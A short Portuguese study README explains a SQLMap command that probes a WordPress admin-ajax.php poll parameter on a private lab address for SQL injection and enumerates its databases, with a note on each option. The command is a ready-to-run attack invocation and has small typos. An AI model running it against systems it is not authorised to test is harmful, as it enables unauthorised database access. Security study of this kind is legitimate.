# Estudo de Teste de Injeção SQL com SQLMap
Neste repositório, estou documentando meu estudo sobre testes de injeção SQL usando SQLMap. Abaixo está o comando que utilizei junto com uma explicação de cada opção:

# Comando SQLMap:
sqlmap -u "172.18.2.3/wordpress/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" --threads=10 --random-agent --dbms=mysql --batch --dbs --proxy=http://127.0.0.1:8080"

# Explicação das Opções:
-u "http//alvo/wordpress/wp-admin/admin-ajax.php": Especifica a URL de destino para o teste de injeção SQL.

--data="action=spAjaxResults&pollid=2": Fornece os dados da solicitação POST a serem testados para injeção SQL.

--threads=10: Define o número de threads para usar durante o teste (neste caso, 10 threads).

--random-agent: Gera um agente de usuário aleatório para cada solicitação HTTP enviada.

--dbms=mysql: Especifica que o alvo está usando o sistema de gerenciamento de banco de dados MySQL.

--batch: Executa o SQLMap em modo de lote, o que significa que ele não solicitará interação do usuário para confirmar ações.

--dbs: Instrui o SQLMap a listar as bases de dados disponíveis no servidor.

--proxy=http://127.0.0.1:8080: Especifica o servidor proxy local que o SQLMap usará para enviar e interceptar o tráfego HTTP.
